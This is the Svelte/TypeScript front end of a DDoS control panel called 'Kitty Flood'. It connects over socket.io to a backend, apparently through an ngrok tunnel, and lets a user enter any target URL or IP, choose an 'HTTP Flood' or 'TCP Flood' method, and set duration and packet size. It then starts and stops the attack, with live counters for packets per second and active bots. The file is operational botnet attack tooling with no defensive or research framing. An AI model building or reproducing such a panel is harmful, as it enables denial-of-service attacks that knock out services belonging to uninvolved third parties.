<script lang="ts">
	import { Button } from '$lib/components/ui/button';
	import type { DefaultEventsMap } from '@socket.io/component-emitter';
	import { io, Socket } from 'socket.io-client';
	import { onMount } from 'svelte';
	import * as Select from '$lib/components/ui/select/index.js';
	import Label from '$lib/components/ui/label/label.svelte';
	import { Input } from '$lib/components/ui/input';
	import { browser } from '$app/environment';
	import { Toaster } from '$lib/components/ui/sonner';
	import { toast } from 'svelte-sonner';
	const HEADERS_BASE = {
		'ngrok-skip-browser-warning': 'true'
	};
	// API Base URL
	const API_BASE =
		browser && window.location.hostname.match(/^(localhost|127\.0\.0\.1)$/)
			? `https://fe94-2a0b-64c0-1-00-20a.ngrok-free.app`
			: '/';

	// Socket setup
	let socket: Socket<DefaultEventsMap, DefaultEventsMap> = io(API_BASE, {
		extraHeaders: HEADERS_BASE,
		transports: ['websocket']
	});

	// State variables
	let stats = { pps: 0, bots: 0, totalPackets: 0 };
	let logs: string[] = [];
	let loadingConfig = false;
	let configuration = ['', ''];
	let target = '';
	let method = 'httpFlood';
	let duration = 60;
	let packetSize = 64;
	let isAttacking = false;

	// Attack Methods
	const attackMethods = [
		{ value: 'httpFlood', label: 'HTTP Flood' },
		{ value: 'tcpFlood', label: 'TCP Flood' }
	];

	// Load configuration from API
	async function loadConfiguration() {
		loadingConfig = true;
		try {
			const response = await fetch(`${API_BASE}/configuration`, { headers: HEADERS_BASE });
			const data = await response.json();
			configuration = [atob(data.proxies), atob(data.uas)];
		} catch (error) {
			console.error('Failed to load configuration:', error);
		} finally {
			loadingConfig = false;
		}
	}

	// Save configuration to API
	async function saveConfiguration() {
		try {
			await fetch(`${API_BASE}/configuration`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					proxies: btoa(configuration[0]),
					uas: btoa(configuration[1])
				})
			});
			toast.success('Configuration saved!');
		} catch (error) {
			console.error('Failed to save configuration:', error);
		}
	}

	// Start Attack
	function startAttack() {
		if (!target.trim()) {
			toast.error('Please enter a valid target!');
			return;
		}
		socket.emit('startAttack', { target, method, duration, packetSize });
		isAttacking = true;
	}

	// Stop Attack
	function stopAttack() {
		socket.emit('stopAttack');
		isAttacking = false;
	}

	// Real-time updates
	if (browser && socket) {
		socket.on('systemStats', (data) => {
			stats = {
				pps: data.pps || 0,
				bots: data.bots || 0,
				totalPackets: data.totalPackets || 0
			};
			if (data.log) logs = [data.log, ...logs].slice(0, 50); // Limit logs to 50 entries
		});

		socket.on('attackEnd', () => {
			isAttacking = false;
		});
	}

	onMount(loadConfiguration);
</script>

<Toaster theme="dark" richColors />
<div class="bg-background flex h-screen w-screen flex-col items-center justify-center">
	<div class="border-border bg-card flex w-full max-w-3xl flex-col rounded-lg border p-8 shadow-md">
		<h1 class="text-card-foreground mb-6 text-center text-4xl font-bold">Kitty Flood</h1>

		<!-- Configuration Section -->
		{#if loadingConfig}
			<p class="text-muted-foreground text-center">Loading configuration...</p>
		{:else}
			<!-- <div class="mb-6">
				<textarea
					class="border-border bg-input text-input-foreground mb-2 h-32 w-full rounded-md border p-2"
					bind:value={configuration[0]}
					placeholder="Proxies (e.g., socks5://host:port)"
				></textarea>
				<Button onclick={saveConfiguration} class="w-full">Save Configuration</Button>
			</div> -->
		{/if}

		<!-- Attack Controls -->
		<div class="mb-6">
			<div class="flex flex-col gap-4">
				<div class="flex gap-2">
					<Input type="text" bind:value={target} placeholder="Target URL or IP" class="w-full" />
					<div class="flex gap-2">
						<Button onclick={startAttack} disabled={isAttacking} class="w-full">Start Attack</Button
						>
						<Button
							onclick={stopAttack}
							variant="destructive"
							disabled={!isAttacking}
							class="w-full"
						>
							Stop Attack
						</Button>
					</div>
				</div>
				<div class="flex gap-4">
					<div class="w-1/3">
						<Label>Attack Method</Label>
						<Select.Root type="single" bind:value={method}>
							<Select.Trigger>{attackMethods.find((m) => m.value === method)?.label}</Select.Trigger
							>
							<Select.Content>
								<Select.Group>
									<Select.GroupHeading>Methods</Select.GroupHeading>
									{#each attackMethods as method}
										<Select.Item value={method.value} label={method.label} />
									{/each}
								</Select.Group>
							</Select.Content>
						</Select.Root>
					</div>
					<div class="w-1/3">
						<Label>Duration (s)</Label>
						<Input type="number" bind:value={duration} min="1" max="300" />
					</div>
					<div class="w-1/3">
						<Label>Packet Size (KB)</Label>
						<Input type="number" bind:value={packetSize} min="1" max="1500" />
					</div>
				</div>
			</div>
		</div>

		<!-- Stats Section -->
		<div class="mb-6">
			<h2 class="text-card-foreground mb-4 text-xl font-semibold">Stats</h2>
			<div class="grid grid-cols-3 gap-4">
				<div class="bg-muted/20 flex flex-col rounded-lg border p-4 font-mono shadow-sm">
					<h3 class="text-muted-foreground text-lg font-semibold">Packets/sec</h3>
					<p class="text-card-foreground text-2xl font-bold">{stats.pps}</p>
				</div>
				<div class="bg-muted/20 flex flex-col rounded-lg border p-4 font-mono shadow-sm">
					<h3 class="text-muted-foreground text-lg font-semibold">Active Bots</h3>
					<p class="text-card-foreground text-2xl font-bold">{stats.bots}</p>
				</div>
				<div class="bg-muted/20 flex flex-col rounded-lg border p-4 font-mono shadow-sm">
					<h3 class="text-muted-foreground text-lg font-semibold">Total Packets</h3>
					<p class="text-card-foreground text-2xl font-bold">{stats.totalPackets}</p>
				</div>
			</div>
		</div>

		<!-- Logs Section -->
		<div>
			<h2 class="text-card-foreground mb-4 text-xl font-semibold">Logs</h2>
			<div
				class="border-border bg-muted/20 h-64 overflow-y-auto rounded-lg border p-4 font-mono text-sm"
			>
				{#each logs as log}
					<p class="text-green-500">{'> '}{log}</p>
				{/each}
				{#if logs.length === 0}
					<p class="text-muted-foreground italic">No logs yet...</p>
				{/if}
			</div>
		</div>
	</div>
</div>

<style>
	/* Add custom padding for mobile and other minor tweaks */
</style>
